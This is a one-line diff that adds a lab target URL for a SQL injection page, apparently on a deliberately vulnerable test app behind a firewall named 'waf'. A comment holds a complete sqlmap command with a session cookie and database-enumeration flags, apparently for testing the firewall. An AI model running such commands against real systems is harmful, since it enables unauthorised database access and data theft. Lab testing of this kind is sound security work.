@@ -1,0 +1,1 @@
+http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=cu4rtl7m6b3g32jo8a9evcp895; security=low" -p id --batch --dbs --flush-session --level=2 --risk=1
